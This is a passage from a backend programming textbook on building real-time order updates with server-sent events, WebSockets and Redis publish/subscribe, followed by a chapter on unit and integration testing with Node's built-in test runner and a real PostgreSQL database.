  5. Challenge The PDF export queue sometimes holds 5,000 jobs, and password-reset emails queued behind them wait for an hour. Propose two designs that keep the emails fast, and compare them.

Answers to the exercises are at the end of the book and in the book’s code repository.

Coming up in Chapter 11

Jobs run behind the scenes; some changes should appear in front of the user at once. Real-time features: WebSockets, server-sent events, and pushing an order’s status to the screen the moment it changes.

11

Chapter 11

Real-time Features

In this chapter you will learn to

  • choose between polling, server-sent events and WebSockets
  • push events to the browser with server-sent events, using nothing but HTTP
  • open two-way connections with WebSockets, and treat every message as untrusted input
  • make real-time work across several servers with Redis publish/subscribe
  • handle the hard parts: reconnecting, missed events, authentication and load

HTTP is a conversation the client always starts: it asks, the server answers, and the server has no way to speak first. Yet many screens should change by themselves: an order moving from “paid” to “shipped”, a chat message arriving, the last kits in stock disappearing. This chapter pushes an order’s status to the screen the moment it changes, first with server-sent events, then with WebSockets, and finally across two running copies of the server, which is where most real-time features break in production.

Bit

The first live feature I built was a counter of people viewing a product. It worked beautifully on my laptop. In production we ran three servers, and each one counted only its own visitors, so the number jumped between three different values every time the page reconnected. That week I learned what publish/subscribe is for.

11.1 Three ways to be up to date

  • Polling: the client asks every few seconds, “anything new?”. Simple, works everywhere, and often good enough; but most answers are “no”, each one costs a request, and news arrives up to one interval late.
  • Server-sent events (SSE): the client makes one ordinary HTTP request, and the server keeps the response open, writing an event whenever something happens. One direction only, server to client, but plain HTTP: it passes through proxies, works with cookies, and browsers reconnect automatically.
  • WebSockets: an HTTP request that is upgraded into a two-way connection, where either side can send a message at any time. The right tool when the client talks a lot too: chat, collaborative editing, games.

For updates that flow from the server to a screen, such as order statuses, notifications and live prices, SSE is usually the simplest choice. This chapter builds both, on one server.

11.2 Server-sent events

An SSE response has the type text/event-stream and is never finished. Each event is a few lines of text followed by an empty line: id: numbers it, event: names it, data: carries it, and a line starting with a colon is a comment, ignored by the browser:

src/app.ts
  app.get<{ Params: { id: string } }>(
    "/orders/:id/events",
    async (request, reply) => {
      // Fastify must not send a reply of its own: this route writes to the socket directly
      reply.hijack();
      reply.raw.writeHead(200, {
        "content-type": "text/event-stream",
        "cache-control": "no-cache",
      });
      reply.raw.write(`: connected to ${name}\n\n`);
      const sub = await subscriber();
      let n = 0;
      await sub.subscribe(`order:${request.params.id}`, (message) => {
        reply.raw.write(`id: ${++n}\nevent: status\ndata: ${message}\n\n`);
      });
      // a comment every 15 seconds keeps proxies from closing a quiet connection
      const ping = setInterval(() => reply.raw.write(": ping\n\n"), 15_000);
      // when the browser goes away, stop listening
      request.raw.on("close", () => {
        clearInterval(ping);
        void sub.close();
      });
    },
  );

To watch it, curl -N (no buffering) plays the browser in one terminal, while a second terminal changes the order’s status twice:

Terminal 1
$ curl -sN localhost:3000/orders/1001/events
: connected to server 3000

id: 1
event: status
data: {"order":1001,"status":"paid","by":"server 3000"}

id: 2
event: status
data: {"order":1001,"status":"shipped","by":"server 3000"}
Terminal 2
# A screen follows order 1001 with server-sent events, while the shop changes its status
$ curl -s -X POST localhost:3000/orders/1001/status -H 'content-type: application/json' -d '{"status":"paid"}'
$ curl -s -X POST localhost:3000/orders/1001/status -H 'content-type: application/json' -d '{"status":"shipped"}'

The two status changes appeared in the first terminal the moment they were made. In a browser, the receiving side is a few lines, with no library:

const events = new EventSource("/orders/1001/events");
events.addEventListener("status", (e) => show(JSON.parse(e.data)));

If the connection drops, EventSource reconnects by itself after a few seconds and sends the last id it saw in a Last-Event-ID header, so a server that keeps recent events can send what was missed (exercise 3).

11.3 WebSockets

A WebSocket starts as an HTTP request with Upgrade: websocket; after the server agrees, the same TCP connection carries messages both ways. With @fastify/websocket, a route marked websocket: true receives the socket. Here the client says which order it wants to watch:

src/app.ts
  app.get("/live", { websocket: true }, async (socket) => {
    const sub = await subscriber();
    socket.on("message", async (raw) => {
      // never trust a message: anything that is not a watch request is refused
      const parsed = Watch.safeParse(parse(String(raw)));
      if (!parsed.success) return socket.close(1008, "bad message");
      const { watch } = parsed.data;
      await sub.subscribe(`order:${watch}`, (message) => socket.send(message));
      socket.send(JSON.stringify({ watching: watch, server: name }));
    });
    socket.on("close", () => void sub.close());
  });

The client side uses the WebSocket class, built into browsers and, since version 22, into Node:

demos/watch.ts
// Node's own WebSocket client (the same API as in browsers)
const [url = "ws://localhost:3000/live", ms = "2000"] = process.argv.slice(2);
const socket = new WebSocket(url);
socket.addEventListener("open", () => socket.send(JSON.stringify({ watch: 1001 })));
socket.addEventListener("message", (event) => console.log("ws:", event.data));
setTimeout(() => socket.close(), Number(ms));

Messages from clients are input like any other, so everything from Chapter 9 applies: the message is parsed safely (invalid JSON must not crash the server), checked against a strict schema, and anything else closes the connection with code 1008, “policy violation”. Size limits matter too: @fastify/websocket takes a maxPayload option, and the plugin’s default is generous.

11.4 Many servers: publish and subscribe

Real-time connections are long-lived and belong to one server process. With two or more servers behind a load balancer, the change may happen on server A while the customer’s screen is connected to server B. Keeping a list of connections in memory, as the first version of any live feature does, then silently fails for some users.

The fix is a message bus that every server listens to. Redis has one built in, publish/subscribe: PUBLISH order:1001 … delivers a message to every connection that ran SUBSCRIBE order:1001, on any server. The route that changes a status does not look for connections at all; it publishes, and whichever servers hold interested screens forward the message:

src/app.ts
export async function buildApp(name: string) {
  const app = Fastify();
  await app.register(websocket);
  // one connection to publish; each subscriber gets its own, because a connection that subscribes can do nothing else
  const redis = await createClient({ url: "redis://localhost:6379" }).connect();
  const subscriber = () => redis.duplicate().connect();
  app.addHook("onClose", () => redis.close());

  app.post<{ Params: { id: string }; Body: { status: string } }>(
    "/orders/:id/status",
    async (request, reply) => {
      const id = Number(request.params.id);
      // the database would be updated here; then everyone watching hears about it, on any server
      const event = { order: id, status: request.body.status, by: name };
      await redis.publish(`order:${id}`, JSON.stringify(event));
      return reply.code(204).send();
    },
  );

Two copies of the server run here, on ports 3000 and 3001. The client connects to 3001, and the changes are made on 3000:

Terminal 1
$ node demos/watch.ts ws://localhost:3001/live
ws: {"watching":1001,"server":"server 3001"}
ws: {"order":1001,"status":"paid","by":"server 3000"}
ws: {"order":1001,"status":"shipped","by":"server 3000"}
Terminal 2
# Two copies of the server: the client is on 3001, the change is made on 3000
$ redis-cli PUBSUB NUMSUB order:1001
1) "order:1001"
2) (integer) 1
$ curl -s -X POST localhost:3000/orders/1001/status -H 'content-type: application/json' -d '{"status":"paid"}'
$ curl -s -X POST localhost:3000/orders/1001/status -H 'content-type: application/json' -d '{"status":"shipped"}'

Redis reported one subscriber to order:1001 (the connection held by server 3001), and both changes, made on server 3000, reached the client on 3001. The same happens with any number of servers. Two properties of pub/sub must be understood before relying on it:

  • Fire and forget. A message reaches only the subscribers connected at that moment; nothing is stored. A screen that connects a second later, or reconnects after a network blip, never sees it (exercise 4). Real-time messages are therefore hints that something changed; the truth stays in the database, and a client that reconnects loads the current state first.
  • A subscribed connection is busy. Once a Redis connection subscribes, it can only receive; publishing and other commands need another connection. Hence redis.duplicate() for each subscriber. With thousands of clients, share one subscriber connection per server and dispatch messages to sockets in memory.

Watch out: real-time does not replace the database

Never make a real-time message the only record of a change. Save the change, then publish; when a client connects or reconnects, send it the current state from the database, then the live updates. If the stream breaks for a minute, the user loses nothing but a little freshness. Redis Streams and dedicated brokers can store messages for replay, but the database remains the source of truth.

Quick check

  1. When is SSE a better choice than WebSockets, and when is it not?
  2. Why did the change made on server 3000 reach a client connected to server 3001?
  3. A client reconnects after being offline for 30 seconds. What did it miss, and how should it catch up?

The answers are at the end of the chapter, after the summary.

11.5 The hard parts

  • Authentication. SSE is an ordinary request, so cookies and headers work as in Chapter 8, with one catch: the browser’s EventSource cannot add an Authorization header, so web clients use the session cookie. The browser’s WebSocket cannot set headers either: authenticate during the upgrade with the cookie, or have the client send a short-lived token as its first message, and close the socket if it does not arrive. And authorize every subscription: a customer may watch their own orders only, the same ownership rule as every other route.
  • Keeping connections alive. Proxies and load balancers close connections that stay quiet, often after 60 seconds. The SSE route sends a comment every 15 seconds; WebSockets have ping and pong frames for the same purpose, which also detect clients that vanished without saying goodbye.
  • Reconnecting. Networks drop, phones sleep, servers restart at every deploy. Clients must reconnect with a growing, random delay, so that ten thousand of them do not all reconnect in the same second after a deploy, and then reload the current state.
  • Capacity. Each open connection holds memory and a file descriptor for as long as the page is open. Node handles tens of thousands of idle connections per process, but limits (ulimit, proxy timeouts, load balancer settings) must be configured for long-lived connections. Graceful shutdown must close them, and clients must expect it.
  • Do you need it? A status that changes twice a day does not need a socket; polling every 30 seconds, or refreshing when the user returns to the tab, may be the better engineering.

Professional habit: test real-time with two servers from day one

Run two copies of the server locally, on two ports, from the first day you build a live feature, and connect the client to one while making changes on the other, exactly as this chapter did. Bugs that appear only with more than one server are the most common real-time bug in production, and they are invisible with one.

Common mistakes

MistakeWhat happensFix
Keeping connections in memory with several serversSome users never get updatesPublish/subscribe through Redis
Treating pub/sub as storageMessages lost during reconnectsThe database holds the state; reload on connect
Trusting client messagesCrashes on bad JSON, unwanted subscriptionsSafe parsing, strict schemas, closing on violations
No authorization on subscriptionsUsers watch other people’s ordersThe same ownership checks as other routes
Quiet connectionsProxies cut them after a minuteComments or pings every 15–30 seconds
Reconnecting at once, all togetherA storm of connections after every deployGrowing, random delays
WebSockets for one-way updatesMore code and infrastructure than neededServer-sent events, or polling
Testing with a single serverBugs that appear only in productionTwo local servers from the start

Summary

  • Polling asks repeatedly; server-sent events keep one HTTP response open for server-to-client events; WebSockets carry messages both ways.
  • SSE is plain text over HTTP: id, event, data; browsers reconnect by themselves and send Last-Event-ID.
  • WebSocket messages are untrusted input: parse safely, validate, limit size, authorize every subscription.
  • With several servers, changes go through Redis publish/subscribe, which delivers to every subscriber on every server.
  • Pub/sub is fire and forget: messages are hints; the database holds the truth, and reconnecting clients reload it.
  • Keep connections alive, reconnect with random delays, and test with two servers from the start.

Quick check answers: 1. SSE fits when updates flow only from the server to the client (statuses, notifications, live prices): it is plain HTTP, works with cookies and proxies, and reconnects by itself. When the client also sends frequent messages (chat, games, collaborative editing), a WebSocket avoids a new HTTP request per message. 2. Server 3000 published the change to the Redis channel order:1001; server 3001 had subscribed to that channel for its client, so Redis delivered the message to it, and it forwarded the message over the WebSocket. 3. Every message published during those 30 seconds: pub/sub does not store them. On reconnecting, it should load the order’s current state from the API (or receive it as the first message), and then follow the live updates.

Practice projects

Each project adds a live feature to the shop. Test each one with two servers running.

Project 11.1 · Easy

A live order page

Show an order’s status on a web page that updates by itself.

You will practise: EventSource, sending the current state first, and reconnecting.

  1. Serve a small HTML page that opens /orders/1001/events with EventSource and shows each status.
  2. Change the SSE route to send the order’s current status as the first event, before any live update.
  3. Stop and restart the server while the page is open, and watch it reconnect and show the current state.

Hint: sending the current state first is what makes reconnecting correct: whatever was missed is replaced by the present.

Project 11.2 · Medium

Only your own orders

Secure the live routes with the authentication of Chapter 8.

You will practise: authenticating long-lived connections, ownership checks, and closing on violations.

  1. Require the session token for the SSE route, and refuse with 404 an order that is not the user’s.
  2. For the WebSocket, require an {"auth": token} message within 5 seconds of connecting, then accept watch requests for the user’s own orders only.
  3. Close the socket with code 1008 for a wrong token, a missing one, or someone else’s order.
  4. Test each case with a script.

Hint: check again when a session ends: a user who signs out should not keep receiving events on a connection opened earlier.

Project 11.3 · Challenge

A live stock counter

Show how many units of each product are left, updated for everyone the moment anyone buys.

You will practise: one subscriber connection per server, fan-out in memory, and load testing.

  1. After each successful order (the atomic update of Chapter 6), publish the new stock to stock:{productId}.
  2. Use a single Redis subscriber per server, and a Map from product id to the set of sockets watching it.
  3. Open 2,000 WebSocket clients across two servers with a script, buy products, and measure how long updates take to arrive.
  4. Kill one server during the test, and show that its clients reconnect to the other and catch up.

Hint: subscribe to a channel when the first socket asks for it and unsubscribe when the last one leaves, so Redis only sends what this server needs.

Exercises

  1. Easy Choose polling, SSE or WebSockets for each, and say why: a delivery tracking page; a support chat; a dashboard of today’s sales refreshed every minute; a multiplayer quiz.
  2. Easy What would happen in the two-server example if the route published nothing and instead looped over the sockets it holds in memory?
  3. Medium Describe how the SSE route could use Last-Event-ID to send the events a reconnecting client missed. Where would the events be kept, and for how long?
  4. Medium Change an order’s status while no client is listening, then connect a client. What does it receive, and what does that show about pub/sub?
  5. Challenge After a deploy, 20,000 browsers reconnect at the same moment and the servers fall over. Propose changes on the client and on the server that prevent it.

Answers to the exercises are at the end of the book and in the book’s code repository.

Coming up in Chapter 12

The shop now has many moving parts. Testing: unit, integration and end-to-end tests, a real database in tests, and a suite fast enough to run on every change.

12

Chapter 12

Testing

In this chapter you will learn to

  • decide what to test with unit, integration and end-to-end tests
  • write clear unit tests with Node’s own test runner, including table-driven tests
  • test routes against a real PostgreSQL database, with files running in parallel
  • replace slow or outside dependencies with test doubles, and control time
  • read a failing test, and measure what the tests cover
  • keep a test suite fast, reliable and worth trusting

Every chapter so far ended with a few tests. This one is about the craft itself. A good test suite is what lets you change code on a Friday afternoon without fear: it tells you within a minute whether the shop still takes orders, still charges the right amount and still refuses what it must refuse. A bad one is slow, fails at random, and is ignored. The difference is not the tool, which here is the test runner built into Node, but the decisions about what to test and how.

Bit

I once worked on a project with two thousand tests that took forty minutes and failed at random about once a day. Nobody believed a red build any more, so real bugs went out with the noise. We deleted a third of the tests, made the rest use a real database properly, and got the suite under three minutes. It caught more bugs with fewer tests.

12.1 What to test, and at which level

  • Unit tests call one function or class directly, with no network, database or clock. They are fast (thousands a second) and point straight at the broken line. They suit logic with many cases: prices, discounts, validation, state changes.
  • Integration tests run a real slice of the application: a route through its validation, its SQL and a real database. They are slower but test what the unit tests cannot: that the query is correct, that the transaction rolls back, that the status code is right.
  • End-to-end tests drive the whole system from the outside, often through a browser with Playwright (Book 2). They prove the main journeys work, and are the slowest and most fragile, so keep them few.

The classic advice is a pyramid: many unit tests, fewer integration tests, a handful of end-to-end tests. For a backend whose value is mostly in its queries, many teams lean towards more integration tests, because a unit test with a mocked database cannot catch a wrong WHERE. The real rule: test each behaviour at the lowest level where a bug in it would actually show.

12.2 Unit tests

The shop’s pricing is a pure function: it takes lines and a code and returns numbers, touching nothing else. That makes it ideal for unit tests:

src/pricing.ts
export function total(lines: Line[], code?: string) {
  const subtotal = lines.reduce((sum, l) => sum + l.price * l.quantity, 0);
  let discount = 0;
  if (code) {
    // discount codes: a percentage off, or a fixed amount (never below zero)
    const rule = CODES[code];
    if (!rule) throw new Error(`unknown discount code: ${code}`);
    discount = rule.percent
      ? Math.round((subtotal * rule.percent) / 100)
      : rule.amount!;
    discount = Math.min(discount, subtotal);
  }
  // VAT of 14% on the discounted subtotal, rounded to the nearest piastre
  // exercise 1: a bug to find, switched on with BUG=1
  const rate = process.env.BUG ? 0.15 : 0.14;
  const vat = Math.round((subtotal - discount) * rate);
  return { subtotal, discount, vat, total: subtotal - discount + vat };
}

Node’s test runner (node:test) provides describe, it (also called test), hooks, mocks and coverage, and node:assert provides the checks. Several cases that differ only in their data are best written as a table: one row per case, one loop that turns rows into tests:

test/pricing.test.ts
describe("total", () => {
  // one row per case: adding a case is one line
  const cases = [
    {
      name: "no code: subtotal plus VAT",
      code: undefined,
      want: { discount: 0, vat: 7980, total: 64980 },
    },
    {
      name: "SAVE10 takes 10% off",
      code: "SAVE10",
      want: { discount: 5700, vat: 7182, total: 58482 },
    },
    {
      name: "FIXED50 takes 50 pounds off",
      code: "FIXED50",
      want: { discount: 5000, vat: 7280, total: 59280 },
    },
  ];
  for (const c of cases) {
    it(c.name, () => {
      assert.partialDeepStrictEqual(total([kit, wheels], c.code), c.want);
    });
  }

  it("a fixed discount never goes below zero", () => {
    const cheap = [{ price: 3000, quantity: 1 }];
    assert.deepEqual(total(cheap, "FIXED50"), {
      subtotal: 3000,
      discount: 3000,
      vat: 0,
      total: 0,
    });
  });

  it("refuses an unknown code", () => {
    assert.throws(() => total([kit], "FREE"), /FREE/);
  });
});
  • Each test name says the behaviour, not the function: “a fixed discount never goes below zero” reads like a rule of the shop, and is what you see when it fails.
  • partialDeepStrictEqual checks the fields that matter for the case and ignores the rest; deepEqual checks the whole object when the whole object is the point.
  • Error cases are tests too: assert.throws checks that an unknown code is refused, and that the message names it.

12.3 Integration tests with a real database

The order route reads and writes PostgreSQL inside a transaction. Mocking the database would test only that the code calls the mock; the bugs worth catching are in the SQL. So the test runs the real route, through app.inject, against a real database:

test/orders.test.ts
const schema = `test_${process.pid}`;
const db = connect(schema);
// a test double: records the calls instead of sending email
const mailer = { send: mock.fn(async (_to: string, _subject: string) => {}) };
const app = buildApp(db, mailer);

before(async () => {
  await sql
    .raw(`CREATE SCHEMA ${schema}; SET search_path = ${schema}; ${SCHEMA}`)
    .execute(db);
});
beforeEach(async () => {
  await sql`TRUNCATE orders RESTART IDENTITY; DELETE FROM products`.execute(db);
  await db
    .insertInto("products")
    .values({ id: 1, name: "Kit", price: 45000, stock: 3 })
    .execute();
  mailer.send.mock.resetCalls();
});
after(async () => {
  await sql.raw(`DROP SCHEMA ${schema} CASCADE`).execute(db);
  await Promise.all([app.close(), db.destroy()]);
});

const order = (quantity: number) =>
  app.inject({
    method: "POST",
    url: "/orders",
    payload: { email: "sara@example.com", productId: 1, quantity, code: "SAVE10" },
  });

test("creates an order with the right total, and sends one confirmation", async () => {
  const res = await order(2);
  assert.equal(res.statusCode, 201);
  assert.deepEqual(res.json(), { id: 1, total: 92340 });
  const { stock } = await db
    .selectFrom("products")
    .select("stock")
    .executeTakeFirstOrThrow();
  assert.equal(stock, 1);
  assert.equal(mailer.send.mock.callCount(), 1);
  assert.deepEqual(mailer.send.mock.calls[0]?.arguments, [
    "sara@example.com",
    "Order 1",
  ]);
});

test("refuses an order larger than the stock, and changes nothing", async () => {
  const res = await order(4);
  assert.equal(res.statusCode, 409);
  const orders = await db.selectFrom("orders").selectAll().execute();
  assert.equal(orders.length, 0);
  assert.equal(mailer.send.mock.callCount(), 0);
});
  • Isolation between files. node --test runs each test file in its own process, in parallel. If two files shared tables, one could delete the other’s rows halfway through. Each file creates its own schema (a namespace inside the database), named after its process, and drops it at the end.
  • Isolation between tests. beforeEach resets the tables to a known state, so every test starts from the same data and tests can run in any order. A test that depends on another test’s leftovers will fail one day for no visible reason.
  • Checking the effects, not just the response. The first test checks the status, the body, the stock left in the database and the email; the second checks that a refused order left no row behind, which is the transaction of Chapter 6 doing its job.

The mailer is the one dependency replaced. Sending real email from tests would be slow and would reach real people, so the app receives a test double: mock.fn records every call, and the test asserts how it was called. This works because buildApp takes the mailer as a parameter instead of importing it, a design that makes code testable without any tricks (dependency injection).

Watch out: mock the edges, not the middle

Replace what is slow, outside your control or has effects in the world: email, payment providers, other companies’ APIs, the clock. Do not mock your own database, your own modules or the framework: tests full of mocks pass while the real thing is broken, and break whenever the code is reorganised even when nothing is wrong. If a test needs ten mocks, the code under test probably does too much.

12.4 Controlling time

A basket left alone for 30 minutes is released. Testing that by waiting 30 minutes is absurd, and testing it with the real clock is fragile. The runner can replace the clock with one the test moves by hand:

test/baskets.test.ts
import assert from "node:assert/strict";
import { test } from "node:test";
import { isExpired } from "../src/baskets.ts";

test("a basket touched recently is kept", (t) => {
  // the clock is mocked: the test moves time instead of waiting 30 minutes
  t.mock.timers.enable({ apis: ["Date"], now: 0 });
  const touched = Date.now();
  t.mock.timers.tick(29 * 60 * 1000);
  assert.equal(isExpired(touched), false);
});

test("a basket left for 30 minutes is released", (t) => {
  t.mock.timers.enable({ apis: ["Date"], now: 0 });
  const touched = Date.now();
  t.mock.timers.tick(30 * 60 * 1000);
  assert.equal(isExpired(touched), true);
});

t.mock.timers makes Date.now() start at the given moment and advance only when the test calls tick, and it is restored automatically when the test ends. The two tests check both sides of the boundary, 29 and 30 minutes, which is where off-by-one bugs live. The same API controls setTimeout and setInterval, for code that schedules work.

12.5 Running and reading tests

Terminal
# All the tests
$ npm test
✔ a basket touched recently is kept (…ms)
✔ a basket left for 30 minutes is released (…ms)
✔ creates an order with the right total, and sends one confirmation (…ms)
✔ refuses an order larger than the stock, and changes nothing (…ms)
▶ total
  ✔ no code: subtotal plus VAT (…ms)
  ✔ SAVE10 takes 10% off (…ms)
  ✔ FIXED50 takes 50 pounds off (…ms)
  ✔ a fixed discount never goes below zero (…ms)
  ✔ refuses an unknown code (…ms)
✔ total (…ms)
ℹ tests 9
ℹ suites 1
ℹ pass 9
ℹ fail 0
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms …

Nine tests across three files, run in parallel processes, in well under a second including the database work. While working on one part, run one file (the runner accepts file names and --test-name-pattern):

Terminal
# One file, while working on it
$ npm test -- test/pricing.test.ts
▶ total
  ✔ no code: subtotal plus VAT (…ms)
  ✔ SAVE10 takes 10% off (…ms)
  ✔ FIXED50 takes 50 pounds off (…ms)
  ✔ a fixed discount never goes below zero (…ms)
  ✔ refuses an unknown code (…ms)
✔ total (…ms)
ℹ tests 5

A test is only useful if its failure tells you what is wrong. Here a bug has been switched on, and the VAT rate is wrong:

Terminal
# A test that fails
$ BUG=1 npm test -- test/pricing.test.ts
✖ failing tests:
test at test/pricing.test.ts:28:5
✖ no code: subtotal plus VAT (…ms)
  AssertionError [ERR_ASSERTION]: Expected values to be partially and strictly deep-equal:
  + actual - expected
  
    {
      discount: 0,
  +   subtotal: 57000,
  +   total: 65550,
  +   vat: 8550
  -   total: 64980,
  -   vat: 7980
    }
  
      at TestContext.<anonymous> (file://test/pricing.test.ts:29:14)
      at Test.runInAsyncScope (node:async_hooks:214:14)

The output names the behaviour that broke, the file and line, and a diff: the expected VAT of 7980 against the 8550 received. That is enough to suspect the rate without opening a debugger. Good names and focused assertions are what make failures this readable.

Quick check

  1. Why does each test file create its own schema?
  2. Why is the mailer replaced with a test double, but not the database?
  3. What does t.mock.timers.tick(30 * 60 * 1000) change, and what does it not?

The answers are at the end of the chapter, after the summary.

12.6 Coverage

Coverage measures which lines and branches the tests ran:

Terminal
# How much of the code the tests run
$ npm run coverage
start of coverage report
------------------------------------------------------------
file        | line % | branch % | funcs % | uncovered lines
------------------------------------------------------------
src         |        |          |         | 
 app.ts     | 100.00 |   100.00 |  100.00 | 
 baskets.ts | 100.00 |   100.00 |  100.00 | 
 db.ts      | 100.00 |   100.00 |  100.00 | 
 pricing.ts | 100.00 |    90.91 |  100.00 | 
------------------------------------------------------------
all files   | 100.00 |    95.65 |  100.00 | 
------------------------------------------------------------
end of coverage report

Every line ran, and one branch in pricing.ts did not (exercise 2). Coverage is a good flashlight and a bad target. Low coverage reliably shows code nobody tests; high coverage proves only that lines were executed, not that anything was checked: a test with no assertions reaches 100% too. Use it to find untested areas, look at the uncovered lines of every change in review, and never chase a percentage for its own sake.

12.7 A suite worth trusting

  • Fast. A suite that runs in seconds is run before every commit; one that takes twenty minutes is run by CI and ignored until it fails. Parallel files, small datasets, and no sleeps.
  • Deterministic. The same code gives the same result every time. Flaky tests usually come from shared data, real time, random values, the order of results without ORDER BY, or waiting for something with a fixed delay. Fix them at once, or delete them: a flaky test teaches the team to ignore red.
  • Testing behaviour. Assert what the user or caller sees (responses, rows, emails sent), not how the code is arranged inside. Then the code can be improved without rewriting the tests.
  • Written with the bug. When a bug is found, first write a test that fails because of it, then fix it. The test proves the fix and keeps the bug from coming back.
  • Run on every change. In CI, on every pull request, against a real PostgreSQL started as a service, and the merge blocked while it is red.

Professional habit: a failing test first, for every bug

Before fixing a bug, reproduce it with a test and watch the test fail for the right reason. Only then fix the code and watch it pass. It takes a few minutes, it often reveals that the bug is not where you thought, and it adds to the suite exactly the case that real life proved you had missed.

Common mistakes

MistakeWhat happensFix
Mocking the databaseWrong SQL passes the testsIntegration tests against a real database
Tests sharing dataFailures that depend on order and timingA schema per file, a reset per test
Real time and real sleepsSlow, flaky testsMocked timers; inject the clock
Only the happy pathRefusals and errors break unnoticedTests for every “no” and every error
Testing private detailsTests break when code is reorganisedAssert behaviour: responses, rows, calls at the edges
Vague names and huge assertionsFailures that say nothingOne behaviour per test, named as a rule
Chasing a coverage numberTests that run code but check nothingCoverage as a flashlight, assertions as the point
Living with flaky testsNobody trusts a red buildFix or delete them at once

Summary

  • Unit tests for logic with many cases, integration tests for routes and SQL against a real database, a few end-to-end tests for the main journeys.
  • Node’s node:test and node:assert are enough: describe, it, hooks, tables of cases, mock.fn, mocked timers and coverage.
  • Integration tests stay independent with a schema per file and a reset per test, and check effects as well as responses.
  • Test doubles replace the edges (email, payments, the clock), passed in through parameters; never the database or your own code.
  • A failure should explain itself: behaviour names and focused assertions.
  • Coverage finds untested code; a fast, deterministic suite run on every change is what makes it trustworthy.

Quick check answers: 1. Test files run in parallel processes; with shared tables, one file’s TRUNCATE or inserts could change another file’s data in the middle of its tests. A schema per file gives each its own tables in the same database. 2. Email has effects outside the system (real messages) and is slow, so the test only needs to know it was asked for, correctly. The database is where the bugs worth catching live (queries, constraints, transactions), so it must be the real one. 3. It moves the mocked Date.now() (and mocked timers) forward by 30 minutes instantly; it does not make real time pass, and it is undone when the test ends.

Practice projects

Each project improves the tests of an application from the earlier chapters. Run every suite at least ten times in a row to prove it is deterministic.

Project 12.1 · Easy

Cover the pricing rules

Extend the pricing function and its table of tests together.

You will practise: table-driven tests, boundary values, and writing the test before the code.

  1. Add a rule: orders above 1,000 pounds before discount get free shipping, others pay 40 pounds. Write the test rows first, including exactly 1,000.
  2. Add codes that expire on a date, and test them with mocked time on both sides of the date.
  3. Reach 100% branch coverage of pricing.ts with meaningful tests.

Hint: boundary values (999.99, 1,000, 1,000.01) are where off-by-one bugs live; give each its own row.

Project 12.2 · Medium

Integration tests for the shop’s API

Give the API of Chapters 3 to 8 a complete integration suite on a real database.

You will practise: schemas per file, migrations in tests, factories for test data, and testing refusals.

  1. Create the schema of each test file by running the real migrations, not hand-written SQL.
  2. Write small factory functions (makeCustomer, makeProduct) with sensible defaults that each test can override.
  3. For every route, test the success, the validation errors, the 401, the 403 or 404, and the 409 cases.
  4. Run the suite in CI against PostgreSQL started as a service.

Hint: running migrations once per schema is slower than hand-written SQL but tests the migrations too; keep it fast by creating the schema once per file, not per test.

Project 12.3 · Challenge

Testing the worker

Test the queue worker of Chapter 10 without a real mail service and without waiting for real backoffs.

You will practise: separating logic from infrastructure, test doubles for services, and testing retries.

  1. Move the job’s logic into a plain function that receives the order id and a mailer, and test it directly.
  2. Test that a mailer failure throws (so the queue retries), and that an invalid address throws UnrecoverableError.
  3. Write one integration test with a real Redis that queues a job, runs a worker with concurrency 1, and waits for the completed event.
  4. Make the retry delays configurable, and use tiny delays in the test.
